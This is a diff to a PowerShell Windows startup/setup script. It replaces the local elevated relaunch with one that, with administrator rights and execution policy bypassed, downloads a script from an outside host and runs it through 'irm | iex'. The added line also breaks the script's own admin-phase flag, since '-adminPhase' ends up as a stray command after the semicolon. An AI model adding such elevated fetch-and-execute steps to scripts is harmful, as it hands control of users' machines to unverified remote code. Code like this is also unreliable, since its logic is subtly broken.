@@ -2,6 +2,8 @@ param(
     [switch]$adminPhase
 )
 
+$scriptUrl = "https://startupwin.bluore.top/online.ps1"
+
 @"
 -------------------------------------------------------------------------
 StartUpWindows
@@ -46,8 +48,7 @@ if (-not $adminPhase -and -not (Is-Admin)) {
     Start-Process pwsh -Verb RunAs -ArgumentList @(
         "-NoProfile",
         "-ExecutionPolicy Bypass",
-        "-File `"$PSCommandPath`"",
-        "-adminPhase"
+        "-Command", "irm '$scriptUrl' | iex; -adminPhase"
     )
 
     ping 127.0.0.1 -n 4 > $null
